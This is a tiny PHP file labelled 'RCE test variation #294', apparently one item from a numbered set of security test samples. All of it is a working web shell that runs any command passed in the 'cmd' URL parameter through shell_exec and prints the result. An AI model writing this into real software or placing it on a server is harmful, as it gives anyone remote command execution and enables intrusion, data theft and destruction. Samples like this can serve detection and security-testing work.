<?php
// RCE test variation #294
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>